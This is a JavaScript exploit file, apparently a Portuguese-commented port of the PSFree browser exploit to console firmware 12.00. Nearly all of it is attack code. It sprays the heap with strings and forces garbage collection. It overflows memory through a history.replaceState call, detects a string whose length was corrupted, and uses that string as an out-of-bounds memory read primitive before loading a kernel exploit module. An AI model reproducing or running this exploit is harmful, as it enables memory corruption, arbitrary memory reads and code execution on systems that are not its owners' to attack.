/* PSFree Port 12.00: Auto-Tuner & Primitive Builder */

import { Int } from './module/int64.mjs';
import { Memory } from './module/mem.mjs'; // Vamos usar isso se conseguirmos o Length!
import {
    log, sleep, hex
} from './module/utils.mjs';

// --- CONFIGURAÇÃO ---
// Começamos no offset que sabemos que acerta os DADOS
let current_offset = 709520; 
const OVERFLOW_AMT = 1024 * 64; 

// Tamanho Vencedor (1MB)
const TARGET_SIZE = 1024 * 1024; 
const PAYLOAD_SIZE = TARGET_SIZE - 24; 

var victims = [];
var corrupted_string = null; // Guardará a string mágica

// ===========================================================================
// FUNÇÃO PRINCIPAL
// ===========================================================================

async function main() {
    log("=== PSFree 12.00: RCE Hunter ===");
    log("Status: Buscando alinhamento de Length a partir de " + current_offset);

    // Tentamos recuar até 64 bytes para achar o cabeçalho
    for (let shift = 0; shift <= 64; shift += 4) {
        
        let test_offset = current_offset - shift;
        log(`\n[TESTE] Offset ${test_offset} (Recuo -${shift})`);

        let result = await run_exploit(test_offset);

        if (result === 'RCE') {
            log("!!! VENCEU !!! LENGTH CORROMPIDO!", 'green');
            log("Iniciando Escalação de Privilégios (Stage 3)...");
            
            // AQUI É ONDE USAMOS AS BIBLIOTECAS
            await initialize_primitives();
            return;
        }
        
        if (result === 'DATA') {
            log(`>> Atingiu DADOS. Header está mais para trás. Continuando...`, 'yellow');
        } else {
            log(`>> Nada atingido. Tentando realinhar...`);
        }

        // Limpeza para próxima tentativa
        victims = [];
        await forceGC();
        await sleep(100);
    }

    log("Fim do loop. Se não conseguiu RCE, reinicie o console.", 'red');
}

// ===========================================================================
// LÓGICA DO EXPLOIT
// ===========================================================================

async function run_exploit(offset) {
    try {
        // 1. Preparar Buffer 1MB (8-bit)
        let rawBuffer = new Uint8Array(PAYLOAD_SIZE);
        rawBuffer.fill(0x42); 
        let decoder = new TextDecoder("utf-8");
        let baseString = decoder.decode(rawBuffer);

        // 2. Spray (80 vítimas)
        victims = [];
        for(let i=0; i<80; i++) {
            let s = i + "_" + baseString.substring((i+"_").length);
            victims.push(s);
        }

        // 3. Buracos
        for(let i=0; i<80; i+=2) victims[i] = null;
        await forceGC();

        // 4. Overflow
        let buffer = "A".repeat(offset);
        buffer += "\x01".repeat(OVERFLOW_AMT);
        history.replaceState({}, "pwn", "/" + buffer);

        // 5. Checagem
        return check_corruption(PAYLOAD_SIZE);

    } catch(e) {
        log("Erro: " + e.message);
        return 'ERR';
    }
}

function check_corruption(originalLen) {
    for(let i=1; i<victims.length; i+=2) {
        let s = victims[i];
        if(!s) continue;

        try {
            let err = new Error(s);
            let msg = err.message;

            // SUCESSO TOTAL (RCE)
            if (msg.length !== originalLen) {
                log(`ALVO LOCALIZADO: String ${i}`, 'green');
                log(`Tamanho Original: ${originalLen} -> Novo: ${msg.length}`, 'green');
                corrupted_string = msg; // Salva a string mágica
                return 'RCE';
            }

            // SUCESSO PARCIAL (DADOS)
            if (msg.charCodeAt(0) === 1) {
                return 'DATA';
            }
        } catch(e) {}
    }
    return 'MISS';
}

// ===========================================================================
// PÓS-EXPLORAÇÃO (USANDO AS LIBS)
// ===========================================================================

async function initialize_primitives() {
    if (!corrupted_string) return;

    log("--- INICIALIZANDO PRIMITIVAS DE MEMÓRIA ---");

    // Aqui simulamos o que o PSFree original faz no make_arw
    // Como temos uma string gigante, podemos usá-la para ler toda a memória
    
    try {
        // Exemplo: Ler o byte 1MB + 100 (Fora dos limites originais)
        let leak_val = corrupted_string.charCodeAt(1024 * 1024 + 100);
        log(`Teste de Leitura OOB: 0x${leak_val.toString(16)}`, 'green');
        
        log("Memória pronta. Carregando Kernel Exploit (Lapse)...");
        
        // Aqui importamos o Lapse, agora que temos as ferramentas para ele funcionar
        import('./lapse.mjs');

    } catch(e) {
        log("Erro ao inicializar primitivas: " + e.message);
    }
}

async function forceGC() {
    try { new ArrayBuffer(50 * 1024 * 1024); } catch(e){}
    return new Promise(r => setTimeout(r, 400));
}

// Inicia
main();
